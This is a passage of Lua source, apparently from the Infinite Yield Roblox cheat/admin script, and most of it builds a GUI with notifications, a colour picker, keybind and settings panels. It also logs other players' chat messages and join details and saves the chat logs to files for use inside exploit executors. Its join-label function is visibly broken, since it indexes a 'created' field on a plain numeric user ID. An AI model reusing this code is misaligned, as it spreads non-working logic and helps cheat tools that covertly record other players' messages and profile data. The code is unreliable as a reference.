					Title_2.BackgroundTransparency = 0
				end)
			end)
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			local closepressed = false
			if text2 then
				Title_2.Text = text
				Text_2.Text = text2
			else
				Title_2.Text = 'Notification'
				Text_2.Text = text
			end
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)
			CloseButton.MouseButton1Click:Connect(function()
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				closepressed = true
				pinNotification:Disconnect()
			end)
			if length and isNumber(length) then
				wait(length)
			else
				wait(10)
			end
			if LnotifyCount == notifyCount then
				if closepressed == false and notificationPinned == false then
					pinNotification:Disconnect()
					Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				end
				notifyCount = 0
			end
		end)
	end

	local lastMessage = nil
	local lastLabel = nil
	local dupeCount = 1
	function CreateLabel(Name, Text)
		if lastMessage == Name..Text then
			dupeCount = dupeCount+1
			lastLabel.Text = Time()..' - ['..Name..']: '..Text..' (x'..dupeCount..')'
		else
			if dupeCount > 1 then dupeCount = 1 end
			if #scroll_2:GetChildren() >= 2546 then
				scroll_2:ClearAllChildren()
			end
			local alls = 0
			for i,v in pairs(scroll_2:GetChildren()) do
				if v then
					alls = v.Size.Y.Offset + alls
				end
				if not v then
					alls = 0
				end
			end
			local tl = Instance.new('TextLabel')
			lastMessage = Name..Text
			lastLabel = tl
			tl.Name = Name
			tl.Parent = scroll_2
			tl.ZIndex = 10
			tl.Text = Time().." - ["..Name.."]: "..Text
			tl.Size = UDim2.new(0,322,0,84)
			tl.BackgroundTransparency = 1
			tl.BorderSizePixel = 0
			tl.Font = "SourceSans"
			tl.Position = UDim2.new(-1,0,0,alls)
			tl.TextTransparency = 1
			tl.TextScaled = false
			tl.TextSize = 14
			tl.TextWrapped = true
			tl.TextXAlignment = "Left"
			tl.TextYAlignment = "Top"
			tl.TextColor3 = currentText1
			tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
			table.insert(text1,tl)
			scroll_2.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
			scroll_2.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+tl.TextBounds.Y)
			tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
			for i = 0,50 do wait(0.05)
				tl.TextTransparency = tl.TextTransparency - 0.05
			end
			tl.TextTransparency = 0
		end
	end

	function CreateJoinLabel(plr,ID)
		if #scroll_3:GetChildren() >= 2546 then
			scroll_3:ClearAllChildren()
		end
		local infoFrame = Instance.new("Frame")
		local info1 = Instance.new("TextLabel")
		local info2 = Instance.new("TextLabel")
		local ImageLabel_3 = Instance.new("ImageLabel")
		infoFrame.Name = randomString()
		infoFrame.Parent = scroll_3
		infoFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		infoFrame.BackgroundTransparency = 1
		infoFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		infoFrame.Size = UDim2.new(1, 0, 0, 50)
		info1.Name = randomString()
		info1.Parent = infoFrame
		info1.BackgroundTransparency = 1
		info1.BorderSizePixel = 0
		info1.Position = UDim2.new(0, 45, 0, 0)
		info1.Size = UDim2.new(0, 135, 1, 0)
		info1.ZIndex = 10
		info1.Font = Enum.Font.SourceSans
		info1.FontSize = Enum.FontSize.Size14
		info1.Text = "Username: "..plr.Name.."\nJoined Server: "..Time()
		info1.TextColor3 = Color3.new(1, 1, 1)
		info1.TextWrapped = true
		info1.TextXAlignment = Enum.TextXAlignment.Left
		info2.Name = randomString()
		info2.Parent = infoFrame
		info2.BackgroundTransparency = 1
		info2.BorderSizePixel = 0
		info2.Position = UDim2.new(0, 185, 0, 0)
		info2.Size = UDim2.new(0, 140, 1, -5)
		info2.ZIndex = 10
		info2.Font = Enum.Font.SourceSans
		info2.FontSize = Enum.FontSize.Size14
		info2.Text = "User ID: "..ID.."\nAccount Age: "..plr.AccountAge.."\nJoined Roblox: Loading..."
		info2.TextColor3 = Color3.new(1, 1, 1)
		info2.TextWrapped = true
		info2.TextXAlignment = Enum.TextXAlignment.Left
		info2.TextYAlignment = Enum.TextYAlignment.Center
		ImageLabel_3.Parent = infoFrame
		ImageLabel_3.BackgroundTransparency = 1
		ImageLabel_3.BorderSizePixel = 0
		ImageLabel_3.Size = UDim2.new(0, 45, 1, 0)
		ImageLabel_3.Image = Players:GetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
		scroll_3.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+infoFrame.AbsoluteSize.Y)
		wait()
		local user = game.Players.LocalPlayer.UserId
		local json = user
		local date = json["created"]:sub(1,10)
		local splitDates = string.split(date,"-")
		info2.Text = string.gsub(info2.Text, "Loading...",splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
	end

	IYMouse.KeyDown:Connect(function(Key)
		if (Key==prefix) then
			Cmdbar:CaptureFocus()
			spawn(function()
				repeat Cmdbar.Text = '' until Cmdbar.Text == ''
			end)
			maximizeHolder()
		end
	end)

	local lastMinimizeReq = 0
	Holder.MouseEnter:Connect(function()
		lastMinimizeReq = 0
		maximizeHolder()
	end)

	Holder.MouseLeave:Connect(function()
		if not Cmdbar:IsFocused() then
			local reqTime = tick()
			lastMinimizeReq = reqTime
			wait(1)
			if lastMinimizeReq ~= reqTime then return end
			if not Cmdbar:IsFocused() then
				minimizeHolder()
			end
		end
	end)

	function updateColors(color,ctype)
		if ctype == shade1 then
			for i,v in pairs(shade1) do
				v.BackgroundColor3 = color
			end
			currentShade1 = color
		elseif ctype == shade2 then
			for i,v in pairs(shade2) do
				v.BackgroundColor3 = color
			end
			currentShade2 = color
		elseif ctype == shade3 then
			for i,v in pairs(shade3) do
				v.BackgroundColor3 = color
			end
			currentShade3 = color
		elseif ctype == text1 then
			for i,v in pairs(text1) do
				v.TextColor3 = color
				if v:IsA("TextBox") then
					v.PlaceholderColor3 = color	
				end
			end
			currentText1 = color
		elseif ctype == text2 then
			for i,v in pairs(text2) do
				v.TextColor3 = color
			end
			currentText2 = color
		elseif ctype == scroll then
			for i,v in pairs(scroll) do
				v.ScrollBarImageColor3 = color
			end
			currentScroll = color
		end
	end

	local colorpickerOpen = false
	ColorsButton.MouseButton1Click:Connect(function()
		cache_currentShade1 = currentShade1
		cache_currentShade2 = currentShade2
		cache_currentShade3 = currentShade3
		cache_currentText1 = currentText1
		cache_currentText2 = currentText2
		cache_currentScroll = currentScroll
		if not colorpickerOpen then
			colorpickerOpen = true
			picker = game:GetObjects("rbxassetid://4908465318")[1]
			picker.Name = randomString()
			picker.Parent = PARENT

			local ColorPicker do
				ColorPicker = {}

				ColorPicker.new = function()
					local newMt = setmetatable({},{})

					local pickerGui = picker.ColorPicker
					local pickerTopBar = pickerGui.TopBar
					local pickerExit = pickerTopBar.Exit
					local pickerFrame = pickerGui.Content
					local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
					local colorStrip = pickerFrame.ColorStrip
					local previewFrame = pickerFrame.Preview
					local basicColorsFrame = pickerFrame.BasicColors
					local customColorsFrame = pickerFrame.CustomColors
					local defaultButton = pickerFrame.Default
					local cancelButton = pickerFrame.Cancel
					local shade1Button = pickerFrame.Shade1
					local shade2Button = pickerFrame.Shade2
					local shade3Button = pickerFrame.Shade3
					local text1Button = pickerFrame.Text1
					local text2Button = pickerFrame.Text2
					local scrollButton = pickerFrame.Scroll

					local colorScope = colorSpace.Scope
					local colorArrow = pickerFrame.ArrowFrame.Arrow

					local hueInput = pickerFrame.Hue.Input
					local satInput = pickerFrame.Sat.Input
					local valInput = pickerFrame.Val.Input

					local redInput = pickerFrame.Red.Input
					local greenInput = pickerFrame.Green.Input
					local blueInput = pickerFrame.Blue.Input

					local mouse = IYMouse

					local hue,sat,val = 0,0,1
					local red,green,blue = 1,1,1
					local chosenColor = Color3.new(0,0,0)

					local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
					local customColors = {}

					dragGUI(picker)

					local function updateColor(noupdate)
						local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
						local hsvColor = Color3.fromHSV(hue,sat,val)

						if noupdate == 2 or not noupdate then
							hueInput.Text = tostring(math.ceil(359*hue))
							satInput.Text = tostring(math.ceil(255*sat))
							valInput.Text = tostring(math.floor(255*val))
						end
						if noupdate == 1 or not noupdate then
							redInput.Text = tostring(math.floor(255*red))
							greenInput.Text = tostring(math.floor(255*green))
							blueInput.Text = tostring(math.floor(255*blue))
						end

						chosenColor = Color3.new(red,green,blue)

						colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
						colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
						colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
						previewFrame.BackgroundColor3 = chosenColor

						newMt.Color = chosenColor
						if newMt.Changed then newMt:Changed(chosenColor) end
					end

					local function colorSpaceInput()
						local relativeX = mouse.X - colorSpace.AbsolutePosition.X
						local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y

						if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end

						hue = (219 - relativeX)/219
						sat = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function colorStripInput()
						local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

						val = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function hookButtons(frame,func)
						frame.ArrowFrame.Up.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum + 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum + 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Up.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 1
							end
						end)

						frame.ArrowFrame.Down.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum - 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum - 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Down.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 1
							end
						end)
					end

					colorSpace.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorSpaceInput()
								end
							end)

							colorSpaceInput()
						end
					end)

					colorStrip.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorStripInput()
								end
							end)

							colorStripInput()
						end
					end)

					local function updateHue(str)
						local num = tonumber(str)
						if num then
							hue = math.clamp(math.floor(num),0,359)/359
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							hueInput.Text = tostring(hue*359)
							updateColor(1)
						end
					end
					hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)

					local function updateSat(str)
						local num = tonumber(str)
						if num then
							sat = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							satInput.Text = tostring(sat*255)
							updateColor(1)
						end
					end
					satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)

					local function updateVal(str)
						local num = tonumber(str)
						if num then
							val = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							valInput.Text = tostring(val*255)
							updateColor(1)
						end
					end
					valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)

					local function updateRed(str)
						local num = tonumber(str)
						if num then
							red = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							redInput.Text = tostring(red*255)
							updateColor(2)
						end
					end
					redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)

					local function updateGreen(str)
						local num = tonumber(str)
						if num then
							green = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							greenInput.Text = tostring(green*255)
							updateColor(2)
						end
					end
					greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)

					local function updateBlue(str)
						local num = tonumber(str)
						if num then
							blue = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							blueInput.Text = tostring(blue*255)
							updateColor(2)
						end
					end
					blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)

					local colorChoice = Instance.new("TextButton")
					colorChoice.Name = "Choice"
					colorChoice.Size = UDim2.new(0,25,0,18)
					colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
					colorChoice.Text = ""
					colorChoice.AutoButtonColor = false
					colorChoice.ZIndex = 10

					local row = 0
					local column = 0
					for i,v in pairs(basicColors) do
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = v
						newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							red,green,blue = v.r,v.g,v.b
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							updateColor()
						end)	

						newColor.Parent = basicColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					row = 0
					column = 0
					for i = 1,12 do
						local color = customColors[i] or Color3.new(0,0,0)
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = color
						newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							local curColor = customColors[i] or Color3.new(0,0,0)
							red,green,blue = curColor.r,curColor.g,curColor.b
							hue,sat,val = Color3.toHSV(curColor)
							updateColor()
						end)

						newColor.MouseButton2Click:Connect(function()
							customColors[i] = chosenColor
							newColor.BackgroundColor3 = chosenColor
						end)

						newColor.Parent = customColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					shade1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade1) end end)
					shade1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
					shade1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)

					shade2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade2) end end)
					shade2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
					shade2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)

					shade3Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade3) end end)
					shade3Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
					shade3Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)

					text1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text1) end end)
					text1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
					text1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)

					text2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text2) end end)
					text2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
					text2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)

					scrollButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,scroll) end end)
					scrollButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
					scrollButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)

					cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end end)
					cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
					cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)

					defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end end)
					defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
					defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)

					pickerExit.MouseButton1Click:Connect(function()
						picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
					end)

					updateColor()

					newMt.SetColor = function(self,color)
						red,green,blue = color.r,color.g,color.b
						hue,sat,val = Color3.toHSV(color)
						updateColor()
					end

					return newMt
				end
			end

			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)

			local Npicker = ColorPicker.new()
			Npicker.Confirm = function(self,color,ctype) updateColors(color,ctype) wait() updatesaves() end
			Npicker.Cancel = function(self)
				updateColors(cache_currentShade1,shade1)
				updateColors(cache_currentShade2,shade2)
				updateColors(cache_currentShade3,shade3)
				updateColors(cache_currentText1,text1)
				updateColors(cache_currentText2,text2)
				updateColors(cache_currentScroll,scroll)
				wait()
				updatesaves()
			end
			Npicker.Default = function(self)
				updateColors(Color3.fromRGB(36, 36, 37),shade1)
				updateColors(Color3.fromRGB(46, 46, 47),shade2)
				updateColors(Color3.fromRGB(78, 78, 79),shade3)
				updateColors(Color3.new(1, 1, 1),text1)
				updateColors(Color3.new(0, 0, 0),text2)
				updateColors(Color3.fromRGB(78,78,79),scroll)
				wait()
				updatesaves()
			end
		else
			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
		end
	end)


	SettingsButton.MouseButton1Click:Connect(function()
		if SettingsOpen == false then SettingsOpen = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
			CMDsF.Visible = false
		else SettingsOpen = false
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
		end
	end)

	On.MouseButton1Click:Connect(function()
		if isHidden == false then
			if StayOpen == false then
				StayOpen = true
				On.BackgroundTransparency = 0
			else
				StayOpen = false
				On.BackgroundTransparency = 1
			end
			updatesaves()
		end
	end)

	Clear.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_2:GetChildren()) do
			child:Destroy()
		end
		scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Clear_2.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_3:GetChildren()) do
			child:Destroy()
		end
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Toggle.MouseButton1Down:Connect(function()
		if logsEnabled then
			logsEnabled = false
			Toggle.Text = 'Disabled'
			updatesaves()
		else
			logsEnabled = true
			Toggle.Text = 'Enabled'
			updatesaves()
		end
	end)

	Toggle_2.MouseButton1Down:Connect(function()
		if jLogsEnabled then
			jLogsEnabled = false
			Toggle_2.Text = 'Disabled'
			updatesaves()
		else
			jLogsEnabled = true
			Toggle_2.Text = 'Enabled'
			updatesaves()
		end
	end)

	selectChat.MouseButton1Down:Connect(function()
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
	end)

	selectJoin.MouseButton1Down:Connect(function()
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
	end)

	if not writefileExploit() then
		notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
	end

	ChatLog = function(plr)
		plr.Chatted:Connect(function(Message)
			if logsEnabled == true then
				CreateLabel(plr.Name,Message)
			end
		end)
	end

	JoinLog = function(plr)
		if jLogsEnabled == true then
			CreateJoinLabel(plr,plr.UserId)
		end
	end

	local CleanFileName = function(str)
		local gsub = string.gsub
		return gsub(str, "[*\\?:<>|]+", "")
	end

	SaveChatlogs.MouseButton1Down:Connect(function()
		if writefileExploit() then
			if #scroll_2:GetChildren() > 0 then
				notify("Loading",'Hold on a sec')
				local placeName = CleanFileName(MarketplaceService:GetProductInfo(PlaceId).Name)
				local writelogs = '-- Infinite Yield Chat logs for "'..placeName..'"\n'
				for _, child in pairs(scroll_2:GetChildren()) do
					writelogs = writelogs..'\n'..child.Text
				end
				local writelogsFile = tostring(writelogs)
				local fileext = 0
				local function nameFile()
					local file
					pcall(function() file = readfile(placeName..' Chat Logs ('..fileext..').txt') end)
					if file then
						fileext = fileext+1
						nameFile()
					else
						writefileCooldown(placeName..' Chat Logs ('..fileext..').txt', writelogsFile)
					end
				end
				nameFile()
				notify('Chat Logs','Saved chat logs to the workspace folder within your exploit folder.')
			end
		else
			notify('Chat Logs','Your exploit does not support write file. You cannot save chat logs.')
		end
	end)

	for _, plr in pairs(Players:GetChildren()) do
		if plr.ClassName == "Player" then
			ChatLog(plr)
		end
	end

	Players.PlayerRemoving:Connect(function(player)
		if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name..'_LC') then
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' or v.Name == player.Name..'_CHMS' then
					v:Destroy()
				end
			end
		end
		if viewing ~= nil and player == viewing then
			workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
			viewing = nil
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			notify('Spectate','View turned off (player left)')
		end
	end)

	Exit.MouseButton1Down:Connect(function()
		logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
	end)

	Hide.MouseButton1Down:Connect(function()
		if logs.Position ~= UDim2.new(0, 0, 1, -20) then
			logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
		else
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end
	end)

	EventBind.MouseButton1Click:Connect(function()
		eventEditor.Frame:TweenPosition(UDim2.new(0.5,-175,0.5,-101), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Add.MouseButton1Click:Connect(function()
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
	end)

	Delete.MouseButton1Click:Connect(function()
		binds = {}
		refreshbinds()
		updatesaves()
		notify('Keybinds Updated','Removed all keybinds')
	end)

	Close_2.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Aliases.MouseButton1Click:Connect(function()
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close_3.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Positions.MouseButton1Click:Connect(function()
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	local selectionBox = Instance.new("SelectionBox")
	selectionBox.Name = randomString()
	selectionBox.Color3 = Color3.new(255,255,255)
	selectionBox.Adornee = nil
	selectionBox.Parent = PARENT

	local selected = Instance.new("SelectionBox")
	selected.Name = randomString()
	selected.Color3 = Color3.new(0,166,0)
	selected.Adornee = nil
	selected.Parent = PARENT

	local ActivateHighlight = nil
	local ClickSelect = nil
	function selectPart()
